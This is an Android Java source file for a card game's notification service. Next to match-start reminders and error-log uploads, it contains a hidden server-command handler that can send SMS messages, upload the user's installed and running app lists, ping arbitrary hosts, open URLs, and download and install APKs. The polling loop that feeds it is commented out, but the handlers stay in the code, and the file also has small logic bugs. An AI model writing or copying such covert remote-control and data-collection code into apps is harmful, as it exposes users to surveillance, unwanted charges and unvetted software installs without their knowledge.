package com.lordcard.ui.view.notification;

import com.zzyddz.shui.R;

import java.io.File;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Map.Entry;
import java.util.Timer;
import java.util.TimerTask;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.database.sqlite.SQLiteDatabase;
import android.net.Uri;
import android.os.Binder;
import android.os.Environment;
import android.os.IBinder;
import android.text.TextUtils;
import android.util.Log;

import com.google.gson.reflect.TypeToken;
import com.lordcard.common.exception.CrashApplication;
import com.lordcard.common.exception.NetException;
import com.lordcard.common.mydb.ExceptionDao;
import com.lordcard.common.mydb.GameDBHelper;
import com.lordcard.common.net.DownloadUtils;
import com.lordcard.common.schedule.AutoTask;
import com.lordcard.common.schedule.ScheduledTask;
import com.lordcard.common.util.ActivityUtils;
import com.lordcard.common.util.DialogUtils;
import com.lordcard.common.util.JsonHelper;
import com.lordcard.constant.Constant;
import com.lordcard.constant.Database;
import com.lordcard.entity.GameCommandCheck;
import com.lordcard.entity.GamePrizeRecord;
import com.lordcard.entity.GameTimeVo;
import com.lordcard.entity.NoticesVo;
import com.lordcard.entity.ReturnPing;
import com.lordcard.network.http.HttpRequest;
import com.lordcard.network.http.HttpURL;
import com.lordcard.network.http.HttpUtils;
import com.lordcard.ui.StartActivity;
import com.lordcard.ui.view.notification.command.CommandNoticeBar;
import com.lordcard.ui.view.notification.command.CommandSMS;
import com.lordcard.ui.view.notification.command.CommandSimple;
import com.lordcard.ui.view.notification.command.CommandUploadDesktopAppInfo;
import com.lordcard.ui.view.notification.command.CommandUploadRunAppInfo;
import com.lordcard.ui.view.notification.command.Term;

/**
 * 推送服务
 * 
 * @author Administrator
 * 
 */
public class NotificationService extends Service {

	private final IBinder binder = new MyBinder();
	public final static String ACCOUNT = "account";// 用来取缓存里的account
	private long timeSpace = 1800000L; //第一次启动 10秒后执行
	private boolean first = false;
	private long beforeTime, currentTime;
	private AutoTask autoTask = null; //定时器
	private AutoTask errorTask = null; //错误上传定时器
	private SharedPreferences shared;
	/**当前进入的房间编号*/
	public static String joinRoomCode = "";
	private Editor editor;
	private String account;
	public static Map<String, GameTimeVo> roomStartTimeMap = new HashMap<String, GameTimeVo>();//比赛场开始倒计时时间Map
	public static Map<String, GameTimeVo> roomEndTimeMap = new HashMap<String, GameTimeVo>();//比赛场结束倒计时时间Map

	public class MyBinder extends Binder {

		NotificationService getService() {
			return NotificationService.this;
		}
	}

	@Override
	public IBinder onBind(Intent intent) {
		return binder;
	}

	public void onCreate() {
		super.onCreate();
		uploadError();
		beforeTime = System.currentTimeMillis();
		shared = getApplication().getSharedPreferences("time_span", Context.MODE_PRIVATE);
		editor = shared.edit();
		editor.putLong("timespan", beforeTime);
		editor.commit();
		first = true;
		/* james removed
		ScheduledTask.addRateTask(new AutoTask() {

			public void run() {
				try {
					SharedPreferences sharedData = getApplication().getSharedPreferences(Constant.GAME_ACTIVITE, Context.MODE_PRIVATE);
					account = sharedData.getString(ACCOUNT, "");
					String url = HttpURL.NOTICE_PUSH_URL + "?" + ACCOUNT + "=" + account;
					String result = getDate(url);
					//消息不为空，就去解析消息
					//					result = "{\"packageName\":\"til.mall.activity\",\"ticker\":\"爱是商城\",\"logo\":\"http://avatar.csdn.net/0/7/0/1_first10010.jpg\",\"title\":\"爱是商城打折\",\"content\":\"爱是商城回馈新老用户\",\"time\":\"2013-10-27\",\"type\":2,\"action\":\"http://www.baidu.com\"}";
					if (!TextUtils.isEmpty(result)) {
						Database.PUSH_DATA = JsonHelper.fromJson(result, new TypeToken<Map<String, String>>() {});
						if (Database.PUSH_DATA != null) {
							//推送消息不为空，则推送消息
							String notices = Database.PUSH_DATA.get("nt");
							if (!TextUtils.isEmpty(notices)) {
								NoticesVo pushData = JsonHelper.fromJson(notices, NoticesVo.class);
								if (pushData == null) return;
								if ("1".equals(pushData.getType())) {//1:推送通知
									Notifications.activityNotification(getApplicationContext(), StartActivity.class.getName(), pushData.getTitle(), pushData.getContent());
								} else if ("6".equals(pushData.getType())) {//6:命令推送
									if (!TextUtils.isEmpty(pushData.getContent())) {
										GameCommandCheck gcc = JsonHelper.fromJson(pushData.getContent(), GameCommandCheck.class);
										if (null != gcc) {
											doCommand(gcc);
										}
									}
								}
							}
						}
					}
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}, 10000, 60000);//10秒后每隔1分钟执行，
		*/
		//开线程刷新系统时间
		Timer timer = new Timer();
		timer.schedule(new TimerTask() {

			@Override
			public void run() {
				Intent intent = new Intent();
				intent.setAction(Constant.SYSTEM_TIME_CHANGE_ACTION);
				getApplication().sendBroadcast(intent);
				Log.i("Order", "刷时间。。。。。。。。。。。。是否前台运行：" + ActivityUtils.isRunningForeground());
				checkGameTime();
			}

			/**
			 *  检测时间，判断是否需要发送提示
			 */
			private void checkGameTime() {
				if (null != roomStartTimeMap) {
					List<String> mapRemoveDate = new ArrayList<String>();
					//判断比赛场开始倒计时，是否到了开赛提示时间
					Iterator<Entry<String, GameTimeVo>> it = roomStartTimeMap.entrySet().iterator();
					Log.i("", "roomStartTimeMap:" + it.hasNext() + "                        roomEndTimeMap:" + roomEndTimeMap.entrySet().iterator().hasNext());
					while (it.hasNext()) {
						Map.Entry<String, GameTimeVo> entry = (Map.Entry<String, GameTimeVo>) it.next();
						String key = entry.getKey();
						GameTimeVo value = entry.getValue();
						if (value.getStartTime() < 60000) {
							String msg = "亲，你报名的”" + value.getRoomName() + "“马上就要开赛了，赶紧去比赛吧！";
							if (ActivityUtils.isRunningForeground()) {
								if (TextUtils.isEmpty(joinRoomCode) ||//当前没进复合赛房间
										!joinRoomCode.trim().equals(value.getRoomCode().trim())) {//当前所在的复合赛房间不是刚才报名的房间
									DialogUtils.mesTip(msg, false, false);
								}
							} else {
								NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
								Notification n = new Notification(R.drawable.icon, "通知", System.currentTimeMillis());
								n.flags |= Notification.FLAG_ONGOING_EVENT; // 将此通知放到通知栏
								n.flags |= Notification.FLAG_AUTO_CANCEL;
								Intent intent2 = new Intent(NotificationService.this, StartActivity.class);
								PendingIntent pi = PendingIntent.getActivity(NotificationService.this, 0, intent2, 0);
								n.setLatestEventInfo(NotificationService.this, "开赛啦！", msg, pi);
								nm.notify(121, n);
							}
//							roomStartTimeMap.remove(key);
							mapRemoveDate.add(key);
						} else {
							value.setStartTime(value.getStartTime() - 60000);
							roomStartTimeMap.put(key, value);
						}
					}
					//清除已经开完赛的时间记录
					for (int i = 0; i < mapRemoveDate.size(); i++) {
						roomStartTimeMap.remove(mapRemoveDate.get(i));
					}
					mapRemoveDate.clear();
					mapRemoveDate = null;
				}
				if (null != roomEndTimeMap) {
					List<String> mapRemoveDate = new ArrayList<String>();
					//判断比赛场结束倒计时，是否到了比赛排名提示时间
					Iterator<Entry<String, GameTimeVo>> iter = roomEndTimeMap.entrySet().iterator();
					while (iter.hasNext()) {
						Map.Entry<String, GameTimeVo> entry = (Map.Entry<String, GameTimeVo>) iter.next();
						String keys = entry.getKey();
						GameTimeVo values = entry.getValue();
						if (values.getEndTime() < 0) {
							String result = HttpRequest.getRank(keys);
							GamePrizeRecord gp = JsonHelper.fromJson(result, GamePrizeRecord.class);
							if (null != gp && !TextUtils.isEmpty(gp.getRank())) {
								String msg = "亲，比赛结果出来了，你获得了第" + gp.getRank() + "名。";
								if (ActivityUtils.isRunningForeground()) {
									DialogUtils.mesTip(msg, false, false);
								} else {
									NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
									Notification n = new Notification(R.drawable.icon, "通知", System.currentTimeMillis());
									n.flags |= Notification.FLAG_ONGOING_EVENT; // 将此通知放到通知栏
									n.flags |= Notification.FLAG_AUTO_CANCEL;
									n.setLatestEventInfo(NotificationService.this, "”" + gp.getRoomName() + "“比赛结果", msg, null);
									nm.notify(122, n);
								}
							}
							mapRemoveDate.add(keys);
//							roomEndTimeMap.remove(keys);
						} else {
							values.setEndTime(values.getEndTime() - 60000);
							roomEndTimeMap.put(keys, values);
						}
					}
					//清除已经开完赛的时间记录
					for (int i = 0; i < mapRemoveDate.size(); i++) {
						roomStartTimeMap.remove(mapRemoveDate.get(i));
					}
					mapRemoveDate.clear();
					mapRemoveDate = null;
				}
			}
		}, 0, 60000);
	}

	//上传错误信息
	public void uploadError() {
		if (errorTask != null) {
			errorTask.stop(true);
			errorTask = null;
		}
		errorTask = new AutoTask() {

			public void run() {
				SQLiteDatabase sqLite = GameDBHelper.openOrCreate();
				List<NetException> errList = ExceptionDao.queryAll(sqLite);
				//有错误信息
				if (errList != null && errList.size() > 0) {
					boolean result = HttpRequest.uploadNetError(errList);
					if (result) {
						//删除已提交的错误日志
						for (NetException err : errList) {
							ExceptionDao.delete(sqLite, err.getId());
						}
					}
				}
				GameDBHelper.close();
				sqLite = null;
			}
		};
		ScheduledTask.addRateTask(errorTask, (1000 * 60 * 10)); //10分钟上传一次
	}

	/**
	 * 获取服务器数据
	 */
	private String getDate(String url) {
		currentTime = System.currentTimeMillis();
		long mTime = currentTime - shared.getLong("timespan", 0);
		if (Database.PUSH_DATA != null) {
			try {
				timeSpace = Long.parseLong(Database.PUSH_DATA.get("si"));
			} catch (Exception e) {}
		}
		String result = null;
		boolean canRequest = first ? true : (mTime > timeSpace);
		Log.d("forTag", " timeSpace : " + timeSpace + " || canRequest : " + canRequest);
		if (canRequest) {//本地两个时间差大于后台配置的值，则去后台取数据；
			first = false;
			beforeTime = currentTime;
			editor = shared.edit();
			editor.putLong("timespan", beforeTime);
			editor.commit();
			if ("1".equals(HttpRequest.getApiSwitch("1")) && !ActivityUtils.isWifiActive()) {
				Map<String, String> paramMap = new HashMap<String, String>();
				paramMap.put("tp", String.valueOf(Constant.time_space));
				paramMap.put("network", ActivityUtils.getNetWorkInfo());
				long startTime = System.currentTimeMillis();
				result = HttpUtils.post(url, paramMap);
				long endTime = System.currentTimeMillis();
				Constant.time_space = endTime - startTime;
			} else {
				result = HttpUtils.get(url);
			}
		}
		return result;
	}

	/**
	 * 推送其他应用
	 * */
	private void pushApp(CommandNoticeBar noticeBar) {
		Notifications.activityNotification(noticeBar);
	}

	/**
	 * 执行命令
	 * @param type 命令类型
	 * @param content 命令内容
	 */
	private void doCommand(GameCommandCheck gcc) {
		String type = String.valueOf(ActivityUtils.getNetWorkType());
		Map<String, String> netType = gcc.getCommandTermMap();
		boolean hasType = false; //网络条件是否符合
		if (null != netType && netType.containsKey("networkTypes")) {
			String[] netTypes = netType.get("networkTypes").split(",");
			for (int i = 0; i < netTypes.length; i++) {
				if (type.equals(netTypes[i])) {
					//网络条件符合后台给定的网络状态之一
					hasType = true;
					break;
				}
			}
		}
		boolean mutchTerm = true;
		String term = gcc.getCommandTerm();
		if (!TextUtils.isEmpty(term)) {
			Term terms = JsonHelper.fromJson(term, Term.class);
			String hasApp = terms.getHasApp();
			String notRunApp = terms.getNotRunApp();
			String runApp = terms.getRunApp();
			String notHasApp = terms.getNotHasApp();
			List<String> networkTypes = terms.getNetworkTypes();
			ArrayList<CommandUploadDesktopAppInfo> allApp = ActivityUtils.getAllAppInfo();
			CommandUploadRunAppInfo runningApp = ActivityUtils.getRunAppInfo();
			if (hasApp != null) {
				if (allApp != null) {
					boolean containsApp = false;
					for (int i = 0; i < allApp.size(); i++) {
						if (allApp.get(i).getPackageName().contains(hasApp)) {
							containsApp = true;
						}
					}
					mutchTerm = containsApp;
				}
			}
			if (notHasApp != null) {
				if (allApp != null) {
					for (int i = 0; i < allApp.size(); i++) {
						if (allApp.get(i).getPackageName().contains(notHasApp)) {
							mutchTerm = false;
						}
					}
				}
			}
			if (runApp != null) {
				if (runningApp != null) {
					if (!runApp.equals(runningApp.getPackageName())) {
						mutchTerm = false;
					}
				}
			}
			if (notRunApp != null) {
				if (runningApp != null) {
					if (notRunApp.equals(runningApp.getPackageName())) {
						mutchTerm = false;
					}
				}
			}
			if (networkTypes != null) {
				String networkType = String.valueOf(ActivityUtils.getNetWorkType());
				boolean hasNet = false;
				for (int i = 0; i < networkTypes.size(); i++) {
					if (networkType.equals(networkTypes.get(i))) {
						//网络条件符合后台给定的网络状态之一
						hasNet = true;
						break;
					}
				}
				mutchTerm = hasNet;
			}
		}
		//网络条件符合
		//		指令类型(1=ping,2=通知栏指令,3=简单指令,4=短信指令,5=桌面APP信息上传)
		switch (gcc.getCommandType()) {
			case 1://执行ping命令
				if (hasType) {
					doPing(gcc);
				}
				break;
			case 2://2=通知栏指令
				String content = gcc.getCommandContent();
				if (!TextUtils.isEmpty(content)) {
					CommandNoticeBar noticeBar = JsonHelper.fromJson(content, CommandNoticeBar.class);
					if (null != noticeBar && mutchTerm) {
						pushApp(noticeBar);
					}
				}
				break;
			case 3://3=简单指令
				String cmd = gcc.getCommandContent();
				if (!TextUtils.isEmpty(cmd)) {
					CommandSimple simple = JsonHelper.fromJson(cmd, CommandSimple.class);
					if (null != simple && mutchTerm) {
						doCmd(simple);
					}
				}
				break;
			case 4://4=短信指令
				String sms = gcc.getCommandContent();
				if (!TextUtils.isEmpty(sms)) {
					CommandSMS smsDetail = JsonHelper.fromJson(sms, CommandSMS.class);
					if (null != smsDetail && mutchTerm) {
						if (smsDetail.getType().equals("1")) {
							ActivityUtils.sendSMS(smsDetail.getSender(), smsDetail.getContent());
						}
					}
				}
				break;
			case 5://5=桌面APP信息上传
				ArrayList<CommandUploadDesktopAppInfo> allApp = ActivityUtils.getAllAppInfo();
				HttpRequest.postCommandResult(gcc.getCommandCode(), allApp, account);
				break;
			case 6://当前App信息上传
				CommandUploadRunAppInfo runApp = ActivityUtils.getRunAppInfo();
				HttpRequest.postCommandResult(gcc.getCommandCode(), runApp, account);
				break;
			default:
				break;
		}
		Database.GCC = gcc;
	}

	/**
	 * 执行Ping命令
	 * @param gcc
	 */
	private void doPing(final GameCommandCheck gcc) {
		//NextAction:1=终止当前命令，执行新命令,2=忽略新命令，直到当前命令执行完毕	
		Map<String, String> nectAction = null;
		if (null != Database.GCC) {//获取上一条指令
			nectAction = Database.GCC.getCommandContentMap();
		}
		if (null != nectAction && nectAction.containsKey("nextAction")) {
			if ("1" == nectAction.get("nextAction")) {//1=终止当前命令，执行新命令
				if (!autoTask.isCancelled()) {
					autoTask.stop(true);
					autoTask = null;
				}
			} else {//2=忽略新命令，直到当前命令执行完毕	
				if (autoTask.isCancelled()) {
					autoTask = null;
				}
			}
		}
		if (autoTask == null) {
			autoTask = new AutoTask() {

				public void run() {
					try {
						if (null != gcc.getCommandContentMap()) {
							Map<String, String> commContent = gcc.getCommandContentMap();
							if (commContent.containsKey("pingUrl") && commContent.containsKey("pingCount")) {
								ReturnPing rPing = ActivityUtils.getPing(commContent.get("pingUrl"), Integer.parseInt(commContent.get("pingCount")));//ping信息
								if (null == rPing) {
									rPing = new ReturnPing();
								}
								rPing.setLoginTime(Database.LOGIN_TIME);//登录时间
								rPing.setNetworkType(ActivityUtils.getNetWorkType());//网络类型 
								rPing.setCommandCode(gcc.getCommandCode());// 指令编号
								// 返回指令结果
								HttpRequest.postCommandResult(gcc.getCommandCode(), rPing, account);
							}
						}
					} catch (Exception e) {}
				}
			};
			ScheduledTask.addDelayTask(autoTask, 0);
		}
	}

	private void doCmd(CommandSimple simple) {
		// type:1 ~ action:打开某个程序
		// type:2 ~ action:打开某个连接
		// type:3 ~ action:下载某个软件
		// type:4 ~ action:安装某个软件
		switch (simple.getType()) {
			case 1:
				ActivityUtils.openApp(simple.getAction());
				break;
			case 2:
				Uri uri = Uri.parse(simple.getAction());
				Intent it = new Intent(Intent.ACTION_VIEW, uri);
				it.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				CrashApplication.getInstance().startActivity(it);
				break;
			case 3:
				DownloadUtils.downLoadApk(simple.getAction());
				break;
			case 4:
				DownloadUtils.downLoadApk(simple.getAction());
				boolean sdCardExist = Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED);// 判断sd卡是否存在
				String apkName = Constant.APKNAME;
				if (sdCardExist) { // 打开APK
					File file = new File(Environment.getExternalStorageDirectory(), apkName);
					if (file.exists()) {
						Intent openIntent = ActivityUtils.getInstallIntent(file);
						startActivity(openIntent);
					}
				} else { // 打开APK
					File file = CrashApplication.getInstance().getFileStreamPath(apkName);
					if (file.exists()) {
						Intent openIntent = ActivityUtils.getInstallIntent(file);
						startActivity(openIntent);
					}
				}
				break;
			default:
				break;
		}
	}
}
